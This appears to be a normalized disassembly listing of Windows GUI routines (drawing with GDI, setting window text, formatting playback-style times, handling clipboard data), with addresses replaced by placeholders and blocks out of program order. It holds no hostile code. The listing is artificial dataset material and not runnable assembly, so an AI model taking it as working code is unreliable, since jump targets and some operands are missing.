mov [ esp + 0x18 ] ecx
fild [ esp + 0x18 ]
mov ebx eax
add ebx esi
mov [ esp + 0x64 ] ebx
fst [ esp + 0x28 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov cl [ esp + 0x2f0 ]
add eax edi
add esp 0x4
test cl cl
mov [ esp + 0x64 ] eax
je r-xdata
mov ecx rw-data
mov [ esp + 0x68 ] ecx
call sub_404310
mov edx [ rw-data ]
push edx
mov [ esp + 0x2e4 ] 0x0
call [ GetDC@IAT ]
mov esi [ rw-data ]
cmp esi 0xffffffff
mov [ esp + 0x18 ] eax
je r-xdata
xor edx edx
xor ecx ecx
test esi esi
jge r-xdata
mov esi [ esp + 0x2e8 ]
test esi esi
jl r-xdata
mov ebx [ rw-data ]
mov eax esi
cdq
idiv ebx
mov edi eax
mov eax [ rw-data ]
and eax 0x1
mov [ esp + 0x14 ] eax
je r-xdata
mov esi [ esp + 0x40 ]
cmp ebx esi
jle r-xdata
mov edx esi
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ rw-data ]
push edx
push eax
mov [ rw-data ] esi
call [ ReleaseDC@IAT ]
mov ecx rw-data
call sub_401420
test esi esi
jl r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
lea eax [ esp + 0x5c ]
push eax
push ecx
call sub_45d710
add esp 0xc
mov eax edi
imul eax ebx
mov ecx esi
sub ecx eax
lea ecx [ edi + 0x1 ]
imul ecx ebx
sub ecx esi
dec ecx
jmp r-xdata
test edi edi
jge r-xdata
sub ebx esi
mov edx ebx
mov ecx [ rw-data ]
push 0xfffffff0
push ecx
call [ GetWindowLongA@IAT ]
push 0x3
mov esi eax
call [ GetSystemMetrics@IAT ]
mov ecx [ esp + 0x44 ]
sub ecx [ esp + 0x3c ]
test esi 0x100000
mov [ esp + 0x10 ] ecx
je r-xdata
imul eax [ rw-data ]
sub esi eax
mov [ esp + 0x10 ] esi
inc eax
imul eax [ rw-data ]
sub eax esi
dec eax
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax esi
cdq
idiv [ rw-data ]
mov edx [ esp + 0x14 ]
test edx edx
mov [ esp + 0x20 ] eax
je r-xdata
mov esi [ esp + 0x44 ]
cmp eax esi
jle r-xdata
mov ecx edi
jmp r-xdata
mov esi [ rw-data ]
fild [ esp + 0x10 ]
mov edi [ rw-data ]
mov eax esi
fdiv [ rw-data ]
cdq
idiv edi
mov ebx [ rw-data ]
mov ebp eax
imul ebp ebx
mov [ rw-data ] ebp
call sub_4b64c4
add eax esi
cdq
idiv edi
mov edi eax
mov eax [ esp + 0x1c ]
imul edi ebx
dec edi
cmp edi eax
mov [ rw-data ] edi
mov esi eax
jl r-xdata
add ecx eax
mov [ esp + 0x10 ] ecx
mov edx [ esp + 0x18 ]
push 0x1
lea ecx [ esp + 0x4c ]
push ecx
push edx
call sub_45d710
add esp 0xc
mov edx [ rw-data ]
mov eax [ esp + 0x30 ]
add edx eax
imul edx ecx
mov [ esp + 0x14 ] edx
push ecx
fild [ esp + 0x18 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0x38 ]
add ecx edx
imul ecx edi
mov [ esp + 0x18 ] ecx
mov esi eax
mov eax [ rw-data ]
fild [ esp + 0x18 ]
sub ebp eax
add esi ebp
mov [ esp + 0x4c ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
fld [ esp + 0x2c ]
fmul [ rw-data ]
mov edi eax
mov eax [ esp + 0x30 ]
sub eax ecx
add edi eax
fstp [ esp ]
mov [ esp + 0x50 ] edi
call sub_452500
fld [ esp + 0x28 ]
fmul [ rw-data ]
mov ebx eax
add ebx esi
mov [ esp + 0x54 ] ebx
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0x38 ]
add ecx edx
imul ecx [ esp + 0x24 ]
mov edx [ esp + 0x34 ]
add esp 0x4
push 0xcc0020
push ecx
mov ecx [ rw-data ]
add ecx edx
imul ecx [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ rw-data ]
add eax edi
push ecx
mov [ esp + 0x64 ] eax
sub eax edi
push eax
sub ebx esi
push ebx
push edi
push esi
push edx
call [ BitBlt@IAT ]
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
test edx edx
jne r-xdata
sub eax esi
mov ecx eax
mov al [ rw-data ]
test al al
jne r-xdata
lea edi [ esi - 0x1 ]
mov [ rw-data ] edi
mov eax [ esp + 0x2e8 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push ecx
push edx
call sub_47ae00
add esp 0xc
test ecx ecx
je r-xdata
mov ebx [ rw-data ]
cmp ebx esi
jge r-xdata
push esi
inc edi
push edi
inc ebp
push ebp
inc ebx
push ebx
lea edx [ esp + 0x7c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x18
mov ecx rw-data
call sub_4010c0
test eax eax
mov eax [ rw-data ]
jbe r-xdata
cmp [ rw-data ] 0x10
mov esi [ rw-data ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0xc
jge r-xdata
mov eax [ rw-data ]
mov edx ebx
imul edx edx 0x1c
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
mov edi [ lstrcatA@IAT ]
push r--data
lea eax [ esp + 0x70 ]
push eax
call edi
push esi
call sub_457f40
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0x70 ]
push ecx
call edi
push r--data
lea edx [ esp + 0x70 ]
push edx
call edi
mov ecx [ rw-data ]
lea eax [ esp + 0x6c ]
push eax
push ecx
call [ SetWindowTextA@IAT ]
mov esi rw-data
cmp [ rw-data ] 0x10
jb r-xdata
cmp eax 0x1c
jge r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
jne r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp [ rw-data ] 0x1d
je r-xdata
mov eax [ rw-data ]
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea esi [ eax + eax * 2 ]
lea eax [ esp + 0x10 ]
shl esi 0x2
push eax
lea ecx [ esi + rw-data ]
call sub_4209f0
test ebx ebx
mov eax [ esp + 0x10 ]
jle r-xdata
mov edx [ rw-data ]
mov ecx ebx
imul ecx ecx 0x70
lea eax [ ecx + edx ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax r--data
jmp r-xdata
add eax 0x4
jmp r-xdata
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp eax [ esi + rw-data ]
je r-xdata
mov ecx ebx
lea esp [ esp ]
mov esi [ eax + 0x4 ]
jmp r-xdata
push eax
push esi
inc edi
push edi
inc ebp
push ebp
inc ebx
push ebx
lea ecx [ esp + 0x80 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x1c
jmp r-xdata
push eax
call sub_457f90
add eax esi
add esp 0x4
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x34 ]
mov ecx 0x10
cmp edx ecx
jb r-xdata
dec ecx
mov eax [ eax ]
jne r-xdata
mov esi [ esp + 0x1c ]
lea esi [ eax + 0x20 ]
mov esi [ eax + 0x20 ]
jmp r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
cmp [ eax + 0x34 ] ecx
jb r-xdata
sub_473580
push 0xffffffff
push sub_4c0e76
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4d0
push ebx
push ebp
push esi
push edi
mov edi [ rw-data ]
xor ebx ebx
and edi 0x3fffffff
cmp edi 0x1
mov [ esp + 0x6c ] bl
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x18 ] edi
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x2c ]
push ecx
push edx
call [ GetClientRect@IAT ]
cmp edi 0xa
mov eax [ esp + 0x38 ]
mov [ esp + 0x1c ] eax
jl r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp edi 0x1e
jge r-xdata
cmp edi 0x14
jge r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
cmp edi 0x32
jne r-xdata
mov eax [ rw-data ]
and eax 0x3fffffff
sub eax 0x13
push eax
push r--data
jmp r-xdata
mov ecx [ rw-data ]
and ecx 0x3fffffff
sub ecx 0x9
push ecx
push r--data
lea edx [ esp + 0x74 ]
push edx
jmp r-xdata
cmp [ rw-data ] 0x10
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp edi 0x64
jne r-xdata
call [ timeGetTime@IAT ]
cmp [ rw-data ] 0x3
mov edx [ rw-data ]
jne r-xdata
lea ecx [ esp + 0x74 ]
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
push esi
call sub_457f40
add esp 0x4
add eax esi
push eax
lea eax [ esp + 0x70 ]
push eax
call [ lstrcpyA@IAT ]
jmp r-xdata
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp edi 0x10a
jge r-xdata
call sub_460ab0
mov esi eax
mov edx esi
lea ecx [ esp + 0x6c ]
shr edx 0xc
push ecx
and edx 0xf
push edx
shr eax 0x10
push eax
call sub_45b070
shl esi 0x14
sar esi 0x14
add esp 0xc
cmp esi ebx
jle r-xdata
cmp edx ebx
je r-xdata
cmp edx ebx
je r-xdata
mov ecx rw-data
mov [ esp + 0x68 ] ecx
call sub_404310
push 0xa
mov [ esp + 0x4ec ] 0x1
call [ GetStockObject@IAT ]
mov ebp [ esp + 0x4f0 ]
push eax
push ebp
call [ SelectObject@IAT ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x70 ]
push ecx
call ebx
push eax
lea edx [ esp + 0x74 ]
push edx
push ebp
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x4f4 ]
test eax eax
mov ecx [ esp + 0x14 ]
je r-xdata
mov eax [ esp + 0x4f4 ]
test eax eax
je r-xdata
mov ebx [ lstrlenA@IAT ]
lea edx [ esp + 0x6c ]
push edx
call ebx
test eax eax
jne r-xdata
cmp edi 0x12c
je r-xdata
mov ecx [ rw-data ]
and ecx 0x7fffffff
sub ecx 0xff
push ecx
push r--data
lea edx [ esp + 0x74 ]
push edx
jmp r-xdata
mov edi [ lstrcatA@IAT ]
push r--data
lea ecx [ esp + 0x70 ]
push ecx
call edi
mov edx [ esi * 4 + rw-data ]
push edx
lea eax [ esp + 0x70 ]
push eax
call edi
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edx [ rw-data ]
sub ecx eax
add ecx esi
sub eax edx
mov esi eax
jmp r-xdata
mov edi [ rw-data ]
mov ecx edi
sub ecx edx
sar ecx 0x2
cmp ecx ebx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
sub ecx eax
add ecx edx
sub eax [ rw-data ]
mov esi eax
jmp r-xdata
mov ecx [ rw-data ]
sub ecx edx
sar ecx 0x2
cmp ecx ebx
jne r-xdata
mov esi [ esp + 0x1c ]
test esi esi
jle r-xdata
mov edx [ esp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x4e0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4dc
retn
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp edi 0x12d
je r-xdata
mov eax 0x45e7b273
mul esi
mov edi edx
shr edi 0xe
mov edx edi
imul edx edx 0xea60
sub esi edx
mov eax 0x10624dd3
mul esi
mov ebp edx
shr ebp 0x6
cmp ecx ebx
jge r-xdata
mov esi [ rw-data ]
cmp esi ebx
jne r-xdata
mov esi [ rw-data ]
dec ecx
cmp esi ecx
jl r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x2c ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x34 ]
sub eax edx
mov edx [ esp + 0x10 ]
cmp edx eax
jg r-xdata
sub esi ecx
mov [ esp + 0x1c ] esi
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
cmp edi 0x12e
je r-xdata
mov eax 0x10624dd3
mul ecx
mov esi edx
shr esi 0x6
mov eax esi
imul eax eax 0x3e8
sub ecx eax
mov eax 0x51eb851f
mul ecx
shr edx 0x5
push edx
push esi
push ebp
push edi
lea ecx [ esp + 0x7c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov esi [ rw-data ]
add esp 0x18
cmp esi ebx
je r-xdata
xor ecx ecx
mov ecx [ edx + esi * 4 + 0x4 ]
mov ebp [ edx + esi * 4 ]
mov esi [ rw-data ]
sub ecx ebp
sub ecx eax
add ecx esi
mov esi [ edi - 0x4 ]
sub esi eax
add esi [ rw-data ]
xor ecx ecx
xor esi esi
jmp r-xdata
mov ecx [ edx + esi * 4 + 0x4 ]
mov edi [ edx + esi * 4 ]
mov edx [ rw-data ]
sub ecx edi
sub ecx eax
add ecx edx
sub eax [ rw-data ]
mov esi eax
jmp r-xdata
mov edx [ rw-data ]
xor ecx ecx
sub eax edx
mov esi eax
jmp r-xdata
mov edx eax
mov [ esp + 0x10 ] edx
cmp [ esp + 0x18 ] 0x200
jl r-xdata
cmp [ rw-data ] 0x10
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp edi 0x12f
je r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x28 ] edx
je r-xdata
mov eax [ rw-data ]
mov [ esp + 0x34 ] edx
lea edx [ esp + 0x2c ]
push edx
add ecx esi
xor edi edi
push eax
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] esi
mov [ esp + 0x40 ] ecx
call [ ValidateRect@IAT ]
mov eax [ rw-data ]
test eax eax
jns r-xdata
sub eax esi
mov ecx eax
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x38 ]
sub eax ecx
mov ecx [ esp + 0x14 ]
lea edi [ ecx + esi ]
cmp edi eax
jle r-xdata
push esi
call sub_457f40
add esp 0x4
add esi eax
cmp edi 0x12c
jne r-xdata
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp edi 0x130
je r-xdata
mov eax [ rw-data ]
imul eax eax 0x1c
mov ecx [ eax + esi + 0x14 ]
add eax esi
cmp ecx ebx
je r-xdata
cmp [ esp + 0x18 ] 0x32
jne r-xdata
mov edx [ rw-data ]
push edi
push edi
push edi
lea ecx [ esp + 0x38 ]
push ecx
push edi
push edx
push ebp
mov [ rw-data ] edi
call sub_478af0
add esp 0x1c
jmp r-xdata
cmp edi 0x12d
jne r-xdata
push esi
push r--data
jmp r-xdata
cmp edi 0x131
je r-xdata
mov esi [ lstrcatA@IAT ]
push r--data
lea ecx [ esp + 0x70 ]
push ecx
call esi
mov eax [ rw-data ]
mov edx [ rw-data ]
imul eax eax 0x1c
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
push ebp
call [ CreateCompatibleDC@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push 0xc8ffc8
push ebp
call [ SetTextColor@IAT ]
push 0x802040
push ebp
call [ SetBkColor@IAT ]
push 0x2
push ebp
call [ SetBkMode@IAT ]
lea eax [ esp + 0x6c ]
push eax
call ebx
push eax
lea ecx [ esp + 0x70 ]
push ecx
push esi
push edi
push ebp
call [ TextOutA@IAT ]
or [ rw-data ] 0x40000000
jmp r-xdata
mov ecx rw-data
call sub_401420
cmp edi 0x12e
jne r-xdata
push esi
push r--data
lea edx [ esp + 0x74 ]
push edx
jmp r-xdata
cmp edi 0x132
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ esp + 0x10 ]
push 0x0
xor eax eax
push 0x0
mov ecx 0xb
lea edi [ esp + 0x44 ]
[ edi ]
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x4c ] edx
push 0x0
lea edx [ esp + 0x4c ]
push edx
neg eax
push 0x0
mov [ esp + 0x54 ] 0x28
mov [ esp + 0x5c ] eax
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x60 ] 0x1
mov [ esp + 0x62 ] 0x20
call [ CreateDIBSection@IAT ]
mov edi eax
test edi edi
mov [ esp + 0x28 ] edi
je r-xdata
cmp edi 0x12f
jne r-xdata
push esi
push r--data
lea eax [ esp + 0x74 ]
push eax
jmp r-xdata
cmp edi 0x133
je r-xdata
push eax
lea edx [ esp + 0x70 ]
push edx
call esi
push r--data
lea eax [ esp + 0x70 ]
push eax
call esi
jmp r-xdata
push esi
call [ DeleteDC@IAT ]
test edi edi
je r-xdata
push edi
push esi
call [ SelectObject@IAT ]
cmp [ esp + 0x18 ] 0x100
jge r-xdata
cmp edi 0x130
jne r-xdata
push esi
push r--data
jmp r-xdata
cmp edi 0x134
je r-xdata
push edi
call [ DeleteObject@IAT ]
cmp [ esp + 0x18 ] 0x200
jge r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
push eax
mov eax [ rw-data ]
push ecx
push 0x0
lea edx [ esp + 0x38 ]
push edx
push 0x0
push eax
push esi
call sub_478af0
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
add esp 0x1c
xor edi edi
test eax eax
lea ebx [ edx * 4 ]
jle r-xdata
cmp edi 0x131
jne r-xdata
push esi
push r--data
lea edx [ esp + 0x74 ]
push edx
jmp r-xdata
cmp edi 0x135
je r-xdata
mov ecx [ esp + 0x10 ]
imul ecx [ esp + 0x24 ]
mov ebp [ CreateSolidBrush@IAT ]
xor eax eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov eax 0x51eb851f
imul ecx
mov ecx [ esp + 0x14 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
push 0xff0000
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] ecx
call ebp
mov ebx [ FillRect@IAT ]
mov edi eax
push edi
lea edx [ esp + 0x40 ]
push edx
push esi
call ebx
push edi
call [ DeleteObject@IAT ]
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x10 ]
push 0xffffff
mov [ esp + 0x40 ] eax
mov [ esp + 0x48 ] ecx
call ebp
mov edi eax
push edi
lea edx [ esp + 0x40 ]
push edx
push esi
call ebx
push edi
call [ DeleteObject@IAT ]
push 0xff
push 0xffffff
push esi
call [ SetTextColor@IAT ]
push 0xff
push esi
call [ SetBkColor@IAT ]
push 0x2
push esi
call [ SetBkMode@IAT ]
jmp r-xdata
push 0xffffff
jmp r-xdata
mov ecx [ esp + 0x20 ]
cmp edi 0x132
jne r-xdata
push esi
push r--data
lea eax [ esp + 0x74 ]
push eax
jmp r-xdata
cmp edi 0x136
jne r-xdata
push 0xa
call [ GetStockObject@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
lea eax [ esp + 0x6c ]
push eax
call ebx
push eax
lea ecx [ esp + 0x70 ]
push ecx
push 0x0
push 0x0
push esi
call [ TextOutA@IAT ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
push 0xcc0020
push 0x0
push 0x0
push esi
push edx
push eax
push ecx
push 0x0
push ebp
call [ BitBlt@IAT ]
or [ rw-data ] 0x40000000
push esi
call [ SetTextColor@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
mov ebx [ lstrlenA@IAT ]
mov edi [ esp + 0x28 ]
mov ebp [ esp + 0x4f0 ]
mov eax [ esp + 0x14 ]
add ecx ebx
inc edi
cmp edi eax
mov [ esp + 0x20 ] ecx
jl r-xdata
jmp r-xdata
cmp edi 0x133
jne r-xdata
push esi
push r--data
jmp r-xdata
cmp edi 0x15e
jne r-xdata
mov esi [ rw-data ]
test esi esi
mov ebp [ wsprintfA@IAT ]
mov [ esp + 0x3c ] r--data
mov [ esp + 0x40 ] r--data
mov [ esp + 0x44 ] r--data
mov [ esp + 0x48 ] r--data
mov [ esp + 0x6c ] 0x0
mov ebx 0x10
jl r-xdata
xor eax eax
test edx edx
jle r-xdata
mov edx [ ecx + eax * 4 ]
shr edx 0x1
and edx 0x7f7f7f
mov [ ecx + eax * 4 ] edx
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x20 ]
inc eax
cmp eax edx
jl r-xdata
cmp edi 0x134
jne r-xdata
push esi
push r--data
lea edx [ esp + 0x74 ]
push edx
jmp r-xdata
cmp edi 0x15f
jne r-xdata
push r--data
lea eax [ esp + 0x70 ]
push eax
call [ lstrcpyA@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
cmp edi 0x135
jne r-xdata
push esi
push r--data
lea eax [ esp + 0x74 ]
push eax
jmp r-xdata
cmp edi 0x200
jne r-xdata
push r--data
lea ecx [ esp + 0x70 ]
push ecx
call [ lstrcpyA@IAT ]
jmp r-xdata
mov al [ esp + 0x6c ]
test al al
jne r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov eax [ rw-data ]
imul esi esi 0x70
add esi eax
cmp [ esi + 0x30 ] 0x1
je r-xdata
push esi
push r--data
mov [ esp + 0x54 ] 0xf
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] 0x0
mov esi [ rw-data ]
cmp esi ebx
mov edi [ rw-data ]
mov [ esp + 0x4e8 ] ebx
mov ebp 0x9
jl r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
jne r-xdata
mov esi [ rw-data ]
cmp esi ebx
jl r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov ecx [ rw-data ]
imul esi esi 0x70
mov eax [ esi + ecx + 0x30 ]
add esi ecx
cmp eax 0x1
je r-xdata
cmp [ esi + 0x18 ] ebx
jb r-xdata
mov eax r--data
jmp r-xdata
lea ecx [ esp + 0x3c ]
mov [ rw-data ] ebx
call sub_4480e0
jmp r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
imul esi esi 0x70
mov ecx [ esi + edi + 0x30 ]
cmp ecx ebp
lea eax [ esi + edi ]
jne r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
jne r-xdata
lea edi [ esi + 0x4 ]
mov edi [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
mov edx [ esp + ecx * 4 + 0x40 ]
push edx
push eax
lea eax [ esp + 0x74 ]
push r--data
push eax
call ebp
add esp 0x10
imul esi esi 0x70
mov ecx [ esi + edi + 0x30 ]
cmp ecx ebp
lea eax [ esi + edi ]
jne r-xdata
mov ecx [ eax + 0x18 ]
mov ebx 0x10
cmp ecx ebx
jb r-xdata
cmp [ esi + 0x18 ] ebx
jb r-xdata
mov eax r--data
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] ebx
jb r-xdata
mov ecx [ eax + 0x18 ]
mov ebx 0x10
cmp ecx ebx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea edi [ esi + 0x4 ]
mov edi [ esi + 0x4 ]
jmp r-xdata
mov edx [ esi + 0x30 ]
mov ecx [ esp + edx * 4 + 0x40 ]
push ecx
push eax
lea edx [ esp + 0x380 ]
push r--data
push edx
call ebp
mov al [ esp + 0x7c ]
mov esi [ lstrcatA@IAT ]
add esp 0x10
test al al
je r-xdata
push eax
call sub_457f40
add esp 0x4
add eax edi
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
push r--data
lea edx [ esp + 0x74 ]
push edx
jmp r-xdata
lea eax [ esp + 0x40 ]
lea edx [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x40 ]
push ecx
push eax
call sub_4af820
mov eax [ esp + 0x60 ]
add esp 0xc
cmp eax ebx
mov eax [ esp + 0x40 ]
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] ebx
jb r-xdata
lea ecx [ esp + 0x378 ]
push ecx
lea edx [ esp + 0x70 ]
push edx
call esi
push r--data
lea eax [ esp + 0x70 ]
push eax
call esi
push eax
push r--data
lea eax [ esp + 0x74 ]
push eax
lea eax [ esp + 0x40 ]
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
call sub_4af820
mov eax [ esp + 0x60 ]
add esp 0xc
cmp eax ebx
mov eax [ esp + 0x40 ]
jae r-xdata
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x3c ]
mov [ esp + 0x4e8 ] 0xffffffff
call sub_4480e0
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
add eax edi
sub_4741a0
push 0xffffffff
push sub_4c0e88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebx
push esi
mov esi [ esp + 0x58 ]
mov eax [ esi ]
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
xor ebx ebx
push esi
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x2c ] 0xffffffff
mov [ esp + 0x30 ] 0x1
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push esi
mov [ esp + 0x20 ] 0x1
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x54 ]
mov edx [ ecx + 0x4 ]
push ebx
push eax
push 0x233
push edx
call [ SendMessageA@IAT ]
lea eax [ esp + 0x8 ]
push eax
call [ ReleaseStgMedium@IAT ]
mov ecx [ esp + 0x68 ]
mov [ ecx ] 0x1
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov [ ecx ] ebx
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] bl
mov edx [ esp + 0xc ]
push edx
mov [ esp + 0x50 ] ebx
call [ GlobalLock@IAT ]
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ecx [ ecx ]
mov ecx [ esp + 0x44 ]
pop esi
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x48
retn 0x18
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x30 ]
call sub_401e80
mov eax [ esp + 0xc ]
push eax
call [ GlobalUnlock@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
call [ ReleaseStgMedium@IAT ]
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x68 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x2c ]
mov [ edx ] 0x1
jae r-xdata
push eax
call sub_452f80
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x2c ]
cmp [ esp + 0x40 ] esi
jb r-xdata
call sub_46fe50
cmp [ esp + 0x40 ] esi
mov eax [ esp + 0x2c ]
jae r-xdata
mov eax [ esp + 0x2c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
push 0x1
push 0xffffffff
push eax
call sub_425d10
add esp 0xc
lea eax [ esp + 0x2c ]
sub_474320
push 0xffffffff
push sub_4c0eb3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x84
mov eax [ esp + 0x94 ]
mov cl [ eax + 0x4 ]
push ebx
push ebp
push esi
xor ebp ebp
mov ebx 0x1
xor esi esi
cmp cl bl
push edi
mov [ esp + 0x4c ] ebp
je r-xdata
mov ecx [ esp + 0x94 ]
pop edi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x90
retn
mov edi [ Sleep@IAT ]
push 0x64
mov [ rw-data ] 0xffffffff
call edi
mov eax [ esp + 0x4c ]
inc eax
cmp eax 0xa
mov [ esp + 0x4c ] eax
jbe r-xdata
cmp [ rw-data ] ebp
jle r-xdata
mov ecx [ esp + 0xa4 ]
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
call sub_472460
mov [ esp + 0x4c ] ebp
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
cmp [ rw-data ] ebp
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x28 ] edx
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax 0xfffffffe
xor esi esi
mov [ rw-data ] eax
call [ GetTickCount@IAT ]
cmp esi ebp
jne r-xdata
push ebx
call edi
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx ebp
mov [ esp + 0x80 ] 0x3e8
